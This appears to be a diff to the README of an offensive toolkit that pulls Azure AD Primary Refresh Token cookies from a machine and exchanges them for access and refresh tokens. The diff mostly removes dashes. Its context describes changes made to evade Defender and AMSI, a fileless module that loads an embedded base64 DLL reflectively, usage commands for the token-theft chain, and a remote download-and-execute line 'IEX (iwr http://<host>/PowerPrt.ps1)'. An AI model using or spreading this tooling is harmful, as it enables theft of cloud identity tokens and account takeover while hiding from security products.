@@ -16,10 +16,10 @@ The original tool was published in July 2020 and stopped working for token excha
 
 | # | Issue | Fix |
 | --- | --- | --- |
-| 1 | CLSID stored as string in metadata — caught by Defender | CLSID reconstructed from integer literals at runtime via `Type.GetTypeFromCLSID()` |
-| 2 | Identifying namespace and class names in metadata — flagged by AMSI | All names replaced with generic alternatives |
-| 3 | Stride bug in unmanaged array walk — wrong struct size corrupts pointer on multi-cookie responses | Fixed to use unmanaged struct size for pointer arithmetic |
-| 4 | No nonce support — cookie uses `iat` timestamp, rejected by AAD since Oct 2020 | Nonce accepted via `--nonce` flag or auto-fetched from AAD |
+| 1 | CLSID stored as string in metadata caught by Defender | CLSID reconstructed from integer literals at runtime via `Type.GetTypeFromCLSID()` |
+| 2 | Identifying namespace and class names in metadata  flagged by AMSI | All names replaced with generic alternatives |
+| 3 | Stride bug in unmanaged array walk wrong struct size corrupts pointer on multi-cookie responses | Fixed to use unmanaged struct size for pointer arithmetic |
+| 4 | No nonce support cookie uses `iat` timestamp, rejected by AAD since Oct 2020 | Nonce accepted via `--nonce` flag or auto-fetched from AAD |
 
 ---
 
@@ -44,7 +44,7 @@ RequestAADRefreshToken2.exe [options] [url]
 | --- | --- |
 | `--nonce`, `-n <value>` | Use a specific nonce obtained externally |
 | `--tenant`, `-t <value>` | Tenant ID or domain for nonce auto-fetch (default: `common`) |
-| `-legacy` | No nonce - uses `iat` timestamp (broken since Oct 2020, warns) |
+| `-legacy` | No nonce uses `iat` timestamp (broken since Oct 2020, warns) |
 | `--help`, `-h` | Show usage |
 
 ### Modes
@@ -120,7 +120,7 @@ Use [Get-PRTToken.ps1](https://gist.github.com/Abdelhadi963/8a7be60ffa9ed2fd5002
 
 ---
 
-## RequestAADRefreshToken.ps1 — PowerShell Port of the EXE
+## RequestAADRefreshToken2.ps1  PowerShell Port of the EXE
 
 `RequestAADRefreshToken.ps1` is a direct PowerShell port of `RequestAADRefreshToken2.exe`.
 The compiled DLL is embedded as base64 and loaded reflectively — no binary on disk required.
@@ -168,7 +168,7 @@ Get-AADRefreshToken
 
 ---
 
-## PowerPrt.ps1 — Fileless All-in-One Module
+## PowerPrt.ps1 Fileless All-in-One Module
 
 `PowerPrt.ps1` is a self-contained PowerShell module that performs the full PRT abuse chain without dropping `RequestAADRefreshToken2.exe` to disk. The compiled DLL is embedded as base64 and loaded reflectively into memory via `Assembly.Load()`.
 
@@ -192,7 +192,7 @@ IEX (iwr http://<host>/PowerPrt.ps1 -UseBasicParsing)
 
 ### Functions
 
-#### `Get-PRTCookie` — Cookie extraction only
+#### `Get-PRTCookie` Cookie extraction only
 
 ```powershell
 # auto nonce (default)
@@ -208,7 +208,7 @@ $c = Get-PRTCookie -Nonce "AQABAAAAAAD..."
 $c = Get-PRTCookie -Legacy
 ```
 
-#### `Invoke-PRTTokenExchange` — Token exchange from existing cookie
+#### `Invoke-PRTTokenExchange` Token exchange from existing cookie
 
 ```powershell
 # MS Graph (default)
@@ -229,7 +229,7 @@ Invoke-PRTTokenExchange -PrtCookie $c -TenantId "contoso.onmicrosoft.com" -Resou
 
 Tokens are saved to `$global:accessToken`, `$global:refreshToken`, `$global:expiresOn` after successful exchange.
 
-#### `Invoke-PRTChain` — Full chain in one call
+#### `Invoke-PRTChain` Full chain in one call
 
 ```powershell
 # full chain, MS Graph
@@ -250,7 +250,7 @@ IEX (iwr http://<host>/PowerPrt.ps1 -UseBasicParsing); Invoke-PRTChain -TenantId
 
 ### Using the Access Token
 
-No Graph module required — hit the API directly:
+No Graph module required hit the API directly:
 
 ```powershell
 $headers = @{ Authorization = "Bearer $global:accessToken" }
